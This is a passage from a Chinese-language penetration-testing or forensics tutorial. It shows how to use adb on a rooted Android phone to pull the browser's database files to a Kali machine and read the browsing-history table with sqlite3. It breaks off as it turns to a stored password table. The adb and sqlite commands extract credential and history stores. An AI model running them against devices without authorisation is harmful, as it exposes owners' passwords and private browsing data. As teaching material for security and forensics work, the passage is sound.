  \ USB 线将其连接到 Kali。在 `Android Platform-Tools` 目录下：\n\n-   输入 `./adb devices` 列出你的安卓设备：\n\
  \n![](img/image01018.jpeg)\n\n-   然后输入 `./adb shell` 获取远程 shell：\n\n![](img/image01019.jpeg)\n\
  \n我们现在拥有了 Android 设备的权限。由于设备已根，我们可以进入通常受保护的圣杯目录 `/data/data`：\n\n-   切换到 `/data/data`\
  \ 目录\n\n-   列出目录内容：\n\n![](img/image01020.jpeg)\n\n在这里我们看到了所有安装程序的系统数据库。每个目录内部都是这些程序的数据文件。如果我们选择一个，例如\
  \ `com.android.browser`，我们就可以查看浏览器的数据：\n\n![](img/image01021.jpeg)\n\n## 浏览器数据库\
  \ - 浏览历史和密码\n\n注意子目录的名称。其中某些可能包含非常重要的信息。让我们检查数据库目录：\n\n-   切换到 `com.android.browser/databases`\
  \ 目录。\n\n-   然后列出内容：\n\n```bash\nroot@android:/data/data/com.android.browser/databases\
  \ # ls\n\nautofill.db\nautofill.db-journal\nbrowser2.db\nbrowser2.db-shm\nbrowser2.db-wal\n\
  webview.db\nwebview.db-shm\nwebview.db-wal\nwebviewCookiesChromium.db\nwebviewCookiesChromiumPrivate.db\n\
  ```\n\n那里有一些听起来很有趣的文件，让我们把整个浏览器目录拉取到 Kali 并分析它。我们可以使用 `./adb pull` 命令来实现。只需使用该命令并加上你想要下载的文件或文件夹即可。\n\
  \n在这种情况下，让我们获取 databases 目录中的所有文件。\n\n-   输入 `exit` 退出 shell\n\n-   然后输入 `./adb\
  \ pull /data/data/com.android.browser/databases`\n\n这将文件下载到我们的 Kali 系统，如下所示：\n\n\
  ![](img/image01022.jpeg)\n\n一旦我们下载了数据库文件，就可以在 Kali 中打开并查看它们。只需运行 `sqlite3` 程序并输入想要查看的数据库文件名。让我们检查\
  \ `browser2` 数据库文件：\n\n![](img/image01023.jpeg)\n\n如果你不熟悉 SQLite，此时你可能会感到有些迷茫。当我们运行\
  \ SQLite 时，它只会给我们一个 `sqlite>` 提示符和简短说明——“输入 `.help` 获取用法提示”。我们还需要用 `;` 结束 SQLite\
  \ 语句。\n\n输入 `.help` 将返回帮助文件：\n\n![](img/image01024.jpeg)\n\n它包含很多命令，但我们只需要知道几个。\n\
  \n-   `.tables` 将返回数据库中所有的表：\n\n![](img/image01025.jpeg)\n\n`SELECT * FROM [table]`\
  \ 命令将向我们显示表的内容。让我们看看 `history` 表里有什么。\n\n-   输入 `SELECT * FROM history;`\n\n![](img/image01026.jpeg)\n\
  \n在这里我们看到了用户访问过的所有网站。\n\n-   输入 `.exit` 退出 SQLite。\n\n让我们看看其他数据库之一，`webview.db`很有趣：\n\
  \n![](img/image01027.jpeg)\n\n一个 `password` 表，这现在可能包含一些有趣的信息！如果我们用 `Select` 命令查看它会发生什么？\n\
